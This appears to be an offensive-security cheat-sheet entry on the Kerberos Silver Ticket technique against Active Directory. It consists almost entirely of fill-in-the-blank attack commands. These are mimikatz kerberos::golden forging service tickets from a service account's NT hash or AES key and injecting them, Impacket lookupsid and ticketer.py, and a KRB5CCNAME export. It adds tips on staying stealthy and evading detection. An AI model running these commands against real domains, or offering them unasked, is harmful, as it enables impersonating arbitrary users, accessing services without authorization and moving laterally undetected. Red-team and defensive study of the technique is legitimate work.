---
technique: SilverTicket
category: kerberos-forged-tickets
targets: Domain Service
protocols: Kerberos
remote_capable: true
tags: kerberos silver-ticket service-ticket forged-pac ad lateral-movement
---

# Silver Ticket

The long-term key of a service account is used to forge a service ticket directly, bypassing the KDC entirely. The forged ticket contains an arbitrary PAC granting the attacker access to that specific service as any user. Because no TGT is involved and no KDC traffic is generated, silver tickets are harder to detect than golden tickets, though their scope is limited to the single service (or services sharing the same account). As of November 2021 updates, the username in the forged ticket must exist in Active Directory or the ticket is rejected. Using an AES key instead of the NT hash is stealthier.

## Windows

Mimikatz kerberos::golden also handles silver tickets by supplying the `/target` and `/service` flags alongside the service account key.

### mimikatz (RC4)

#powershell #mimikatz #service-ticket

Forge a silver service ticket for a specific service using the service account NT hash and inject it into the current session.

```powershell title:"Forge silver ticket via mimikatz (RC4)"
kerberos::golden /domain:$domain /sid:$domain_sid /rc4:$service_nt_hash /user:$impersonate_user /target:$target_fqdn /service:$spn_type /ptt
```
<!-- cheat
var domain
var domain_sid
var service_nt_hash
var impersonate_user
var target_fqdn
var spn_type
-->

### mimikatz (AES)

#powershell #mimikatz #service-ticket

Forge a silver service ticket for a specific service using the service account AES-256 key and inject it into the current session.

```powershell title:"Forge silver ticket via mimikatz (AES)"
kerberos::golden /domain:$domain /sid:$domain_sid /aes256:$service_aes256 /user:$impersonate_user /target:$target_fqdn /service:$spn_type /ptt
```
<!-- cheat
var domain
var domain_sid
var service_aes256
var impersonate_user
var target_fqdn
var spn_type
-->

## Linux

Impacket lookupsid retrieves the domain SID and ticketer forges the service ticket with a service-scoped SPN.

### lookupsid (get domain SID)

#python #impacket #ldap

Retrieve the domain SID needed as input for the silver ticket PAC.

```sh title:"Retrieve domain SID via Impacket lookupsid"
lookupsid.py -hashes "aad3b435b51404eeaad3b435b51404ee":"$nt_hash" "$domain"/"$user"@"$rhost_ip" 0
```
<!-- cheat
import domain_ip
import users
var dc_ip
var nt_hash
var domain
-->

### ticketer (RC4)

#python #impacket #service-ticket

Forge a silver service ticket for a specific SPN using the service account NT hash and save it as a ccache file.

```sh title:"Forge silver ticket via Impacket ticketer (RC4)"
ticketer.py -nthash "$service_nt_hash" -domain-sid "$domain_sid" -domain "$domain" -spn "$target_spn" "$impersonate_user"
```
<!-- cheat
import domain_ip
var service_nt_hash
var domain_sid
var domain
var target_spn
var impersonate_user
-->

### ticketer (AES)

#python #impacket #service-ticket

Forge a silver service ticket for a specific SPN using the service account AES key and save it as a ccache file.

```sh title:"Forge silver ticket via Impacket ticketer (AES)"
ticketer.py -aesKey "$service_aes_key" -domain-sid "$domain_sid" -domain "$domain" -spn "$target_spn" "$impersonate_user"
```
<!-- cheat
import domain_ip
var service_aes_key
var domain_sid
var domain
var target_spn
var impersonate_user
-->

### export KRB5CCNAME (ticketer)

#shell #env

Set KRB5CCNAME to the ccache written by ticketer.py so subsequent Kerberos tools use the forged ticket.

```sh title:"Load ticketer.py ccache into KRB5CCNAME"
export KRB5CCNAME="$impersonate_user.ccache"
```
<!-- cheat
var impersonate_user
-->
